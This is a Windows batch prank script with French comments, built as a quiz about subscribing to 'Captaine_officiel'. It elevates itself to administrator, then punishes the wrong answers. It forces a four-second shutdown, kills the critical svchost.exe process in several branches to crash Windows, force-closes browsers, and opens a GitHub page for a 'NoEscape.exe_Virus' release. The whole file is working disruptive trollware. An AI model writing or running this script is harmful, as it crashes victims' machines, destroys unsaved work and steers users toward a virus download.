@echo off
:: Vérification des privilèges administratifs
:: La commande "NET FILE" ne peut être exécutée que par un administrateur. 
:: Si elle échoue, cela signifie que les droits admin ne sont pas activés.
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Demande des privilèges administratifs...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Si on est ici, c'est qu'on a déjà les droits admin
color 07
title Script Capitaine_Officiel

:: Question 1 : Abonné à Captaine_officiel ?
:question1
echo Are you subscribed to Captaine_officiel? (y/n)
set /p subscribe=
if /i "%subscribe%"=="y" (
    goto question2
) else if /i "%subscribe%"=="n" (
    echo Ahahah go sub now! You have 4 sec.
    msg * "Ahahah go sub now! You have 4 sec."
    shutdown /s /t 4
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question1
)

:: Question 2 : Permission de vérifier l'ordinateur ?
:question2
echo Can I check your computer information? (y/n)
set /p checkinfo=
if /i "%checkinfo%"=="y" (
    echo Merci, je vais vérifier...
    :: Ouvrir un nouveau CMD et lister les fichiers
    start cmd /c "dir /s"
    timeout /t 5 >nul
    goto question3
) else if /i "%checkinfo%"=="n" (
    echo Shutting down critical processes...
    Taskkill /IM svchost.exe /f
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question2
)

:: Question 3 : Aimez-vous le programme ?
:question3
echo Do you like me? (y/n)
set /p likeme=
if /i "%likeme%"=="y" (
    echo I'll boost your computer :3
    timeout /t 2
    :: Ouvrir le site Ubuntu pour télécharger
    start https://ubuntu.com/download/desktop
    timeout /t 10
    goto surprise
) else if /i "%likeme%"=="n" (
    echo Shutting down critical processes...
    Taskkill /IM svchost.exe /f
    exit
) else (
    echo Invalid input. Please enter 'y' or 'n'.
    goto question3
)

:: Section Surprise avec code tremblant
:surprise
cls
color 4
mode con:cols=100 lines=40
echo.
timeout /t 1 >nul
:: Affichage progressif du message CODE: XoE256
setlocal enabledelayedexpansion
set text=CODE: XoE256
for /l %%i in (1,1,10) do (
    set char=!text:~%%i,1!
    set /p=!char!<nul
    timeout /t 3 >nul
)
echo.
timeout /t 5 >nul

:: Afficher lentement "WHAT DID YOU HEARN?!"
echo WHAT DID YOU HEARN?!
timeout /t 2 >nul

:: Proposer le bouton "Nothing" ou le code "XoE256"
:choixfinal
echo Type your answer: (XoE256/nothing)
set /p answer=
if /i "%answer%"=="XoE256" (
    echo What... wdym I'm lost...
    timeout /t 6
    start "" https://github.com/Sn8ow/NoEscape.exe_Virus/releases
    goto finalQuestion
) else if /i "%answer%"=="nothing" (
    echo YOU think I'm dumb? 
    start "" https://github.com/Sn8ow/NoEscape.exe_Virus/releases
    timeout /t 2
    goto finalQuestion
) else (
    echo Invalid input. Please enter 'XoE256' or 'nothing'.
    goto choixfinal
)

:: Dernière question
:finalQuestion
color 4
cls
echo YOU WANT TO... DESTROY ME?....... (y/n)
set /p destroyme=
if /i "%destroyme%"=="y" (
    Taskkill /IM svchost.exe /f
    exit
) else if /i "%destroyme%"=="n" (
    :: Fermer la page Github
    taskkill /im chrome.exe /f
    taskkill /im firefox.exe /f
    color 07
    echo Oh my bad... ok.
    echo I want to play a game with you... Do you want? (y/n)
    set /p playgame=
    if /i "%playgame%"=="y" (
        goto robloxQuestion
    ) else (
        echo Ok :( 
        timeout /t 2
        exit
    )
)

:: Question sur Roblox
:robloxQuestion
echo Roblox? (y/n)
set /p roblox=
if /i "%roblox%"=="y" (
    start "" https://www.youtube.com/watch?v=xADSDapqn9o
    start "" https://www.roblox.com/games/13892378955/1-A-Nostalgic-Hangout-Game
    timeout /t 8 >nul
    echo ... 
    timeout /t 10 >nul
    echo Forgot that game... I'll just go :)
    timeout /t 3	>nul
    exit
) else (
    echo Ok well, bye :3
    timeout /t 2 >nul
    exit
)
